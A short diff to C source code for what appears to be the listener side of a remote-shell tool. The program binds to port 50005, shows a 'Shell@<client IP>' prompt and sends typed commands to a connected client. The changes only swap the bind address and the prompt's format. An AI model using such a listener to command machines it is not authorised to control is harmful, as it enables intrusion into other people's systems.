@@ -26,7 +26,7 @@ int main()
 	}
 
 	server_address.sin_family = AF_INET;
-	server_address.sin_addr.s_addr = inet_addr("192.168.1.6");
+	server_address.sin_addr.s_addr = inet_addr("172.30.1.69");
 	server_address.sin_port = htons(50005);
 
 	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
@@ -39,7 +39,7 @@ int main()
 		jump:
 		bzero(&buffer, sizeof(buffer));
 		bzero(&response, sizeof(response));
-		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
+		printf("*[Shell@%s]~$: ", inet_ntoa(client_address.sin_addr));
 		fgets(buffer, sizeof(buffer), stdin);
 		strtok(buffer, "\n");
 		write(client_socket, buffer, sizeof(buffer));
